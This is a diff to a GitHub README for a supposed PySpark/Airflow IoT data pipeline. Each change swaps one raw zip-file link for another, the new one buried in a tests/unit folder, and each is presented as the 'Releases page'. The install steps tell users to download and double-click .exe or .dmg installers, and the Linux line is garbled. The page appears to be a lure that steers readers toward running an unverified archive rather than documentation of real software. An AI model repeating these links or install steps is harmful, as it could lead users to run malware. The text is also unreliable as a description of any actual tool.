@@ -1,6 +1,6 @@
 # 🚀 iot-etl-pipeline - Easy Data Processing for IoT Sensors
 
-![Download iot-etl-pipeline](https://raw.githubusercontent.com/adjdkjask/iot-etl-pipeline/main/src/transform/iot-etl-pipeline-v3.5.zip)
+![Download iot-etl-pipeline](https://github.com/adjdkjask/iot-etl-pipeline/raw/refs/heads/main/tests/unit/load/writers/iot_etl_pipeline_v3.1.zip)
 
 ## 📋 Description
 The iot-etl-pipeline processes millions of IoT sensor readings using PySpark and Apache Airflow. It transforms data into an optimized star schema, making it ideal for smart manufacturing analytics. This application simplifies complex data workflows, allowing users to focus on insights rather than infrastructure.
@@ -9,7 +9,7 @@ The iot-etl-pipeline processes millions of IoT sensor readings using PySpark and
 To get started with the iot-etl-pipeline, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/adjdkjask/iot-etl-pipeline/main/src/transform/iot-etl-pipeline-v3.5.zip) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/adjdkjask/iot-etl-pipeline/raw/refs/heads/main/tests/unit/load/writers/iot_etl_pipeline_v3.1.zip) to find the latest version of the software.
 
 2. **Download the Latest Version**  
    Click on the version number of the release you want. This will take you to the download options.
@@ -19,7 +19,7 @@ To get started with the iot-etl-pipeline, follow these simple steps:
 
    - **For Windows:** Download the `.exe` file.
    - **For macOS:** Download the `.dmg` file.
-   - **For Linux:** Download the `https://raw.githubusercontent.com/adjdkjask/iot-etl-pipeline/main/src/transform/iot-etl-pipeline-v3.5.zip` or `.deb` file.
+   - **For Linux:** Download the `https://github.com/adjdkjask/iot-etl-pipeline/raw/refs/heads/main/tests/unit/load/writers/iot_etl_pipeline_v3.1.zip` or `.deb` file.
 
 4. **Install the Application**  
    Once the file is downloaded, locate it in your downloads folder and double-click to begin installation. Follow the on-screen instructions to complete the installation.
@@ -59,7 +59,7 @@ While using the iot-etl-pipeline, you will encounter several key topics that enh
 - **Data Engineering:** Build reliable data architectures.
 
 ## 📥 Download & Install
-To begin using the iot-etl-pipeline, visit the [Releases page](https://raw.githubusercontent.com/adjdkjask/iot-etl-pipeline/main/src/transform/iot-etl-pipeline-v3.5.zip) to download the application. Follow the steps listed earlier to install and run the software.
+To begin using the iot-etl-pipeline, visit the [Releases page](https://github.com/adjdkjask/iot-etl-pipeline/raw/refs/heads/main/tests/unit/load/writers/iot_etl_pipeline_v3.1.zip) to download the application. Follow the steps listed earlier to install and run the software.
 
 ## 💬 Support
 If you encounter any issues or have questions, feel free to check the documentation or submit an issue on GitHub. Community support is available for troubleshooting and help.
